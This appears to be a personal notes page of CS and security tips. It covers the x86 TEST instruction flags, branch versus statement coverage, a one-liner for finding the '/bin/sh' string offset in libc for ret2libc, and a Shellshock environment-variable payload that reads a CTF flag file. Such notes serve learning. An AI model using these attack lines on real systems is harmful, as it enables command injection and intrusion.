# Tips and Tricks

#### Finding string offsets for ret2libc attack

`strings -a -t x /lib32/libc-2.24.so | grep /bin/sh`

#### The ever forgetful `test` instruction

The TEST instruction performs a bitwise AND on two operands. The flags SF(Sign Flag a.k.a. Negative Flag), ZF(Zero Flag), PF(Parity Flag) are modified while the result of the AND is discarded. The OF(Overflow Flag) and CF(Carry Flag) flags are set to 0, while AF(Auxillary Carry Flag) flag is undefined. There are 9 different opcodes for the TEST instruction depending on the type and size of the operands. It can compare 8-bit, 16-bit, 32-bit or 64-bit values. It can also compare registers, immediate values and register indirect values.

The Sign Flag(Negative Flag) is set to the most significant **bit** of the result of the AND. In two's complement, a number with most significant bit = 1 is negative. If the result is 0, the Zero Flag is set to 1, otherwise 0. The Parity Flag is set to the bitwise XNOR of the least significant **BYTE** of the result i.e. if the number of 1s in the least significant byte is even, then the PF is set to 1 else 0.

#### Branch coverage v/s Statement coverage

Unless we consider `goto` as a branch, branch coverage doesn't imply statement coverage and vice-versa.

If we consider `goto` as a branch, then branch coverage implies statement coverage but not vice-versa(Even if we take **simple** statements).(Note that if we have a `goto` statement, then one branch will never be covered so we'll never have full branch coverage in case of a goto statement.
See the following example:

```
if(x)
  then S1;
 
S2;
```
So if `x=1`, then every statement gets covered but not every branch(the false branch).

Take a look at [this presentation](https://www.cs.drexel.edu/~jhk39/teaching/cs576su06/L4.pdf). Note that the numbers on the left show the order of execution for a certain input.

**Note:** Path coverage >= Branch coverage >= Statement coverage

#### Compound statement

```
if(x){
  S1;
  S2;
  S3;
}
```

This whole is a single compuound statement while S1, S2, S3 are simple statements.

#### Shellshock

`export x='() { :;}; echo $(/bin/cat /home/shellshock/flag)'`

The pattern `() { :;};` is the key!
